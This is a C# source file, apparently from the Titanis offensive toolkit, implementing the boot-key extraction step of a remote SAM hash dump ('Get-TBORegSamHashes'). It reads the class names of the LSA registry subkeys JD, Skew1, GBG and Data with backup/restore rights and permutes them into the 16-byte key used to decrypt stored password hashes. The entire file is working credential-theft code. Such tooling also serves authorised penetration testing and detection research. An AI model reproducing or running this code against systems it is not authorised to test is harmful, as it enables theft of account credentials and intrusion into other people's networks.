using System;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;

namespace Titanis.Tbo.Smb2.PowerShell
{
	internal static class RegistryBootKeyReader
	{
		internal const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
		private const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
		private static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };

		internal static byte[] ExtractBootKey(
			IRegistryKey lsaKey,
			string lsaKeyPath,
			CancellationToken cancellationToken,
			Action<string>? log)
		{
			if (lsaKey == null)
				throw new ArgumentNullException(nameof(lsaKey));
			if (string.IsNullOrWhiteSpace(lsaKeyPath))
				lsaKeyPath = lsaKey.KeyPath;

			byte[] bootKey = new byte[16];
			ulong swapKey = BootKeyByteSwap;
			foreach (var subkeyName in BootKeySubkeys)
			{
				log?.Invoke($"Get-TBORegSamHashes: reading LSA subkey {lsaKeyPath}\\{subkeyName}.");
				using var subkey = lsaKey.OpenSubkey(
					subkeyName,
					RegistryAccessRights.QueryValue,
					RegistryKeyOptions.BackupRestore,
					cancellationToken).GetAwaiter().GetResult();
				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				log?.Invoke($"Get-TBORegSamHashes: LSA subkey {subkeyName} class length {(className?.Length ?? 0)}.");
				if (string.IsNullOrWhiteSpace(className))
					throw new InvalidOperationException($"Registry class for {lsaKeyPath}\\{subkeyName} is empty.");

				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
				if (bytes.Length < 4)
					throw new InvalidOperationException($"Registry class for {lsaKeyPath}\\{subkeyName} does not contain 4 bytes.");

				for (int i = 0; i < 4; i++)
				{
					bootKey[(int)(swapKey & 0x0F)] = bytes[i];
					swapKey >>= 4;
				}
			}

			return bootKey;
		}
	}
}
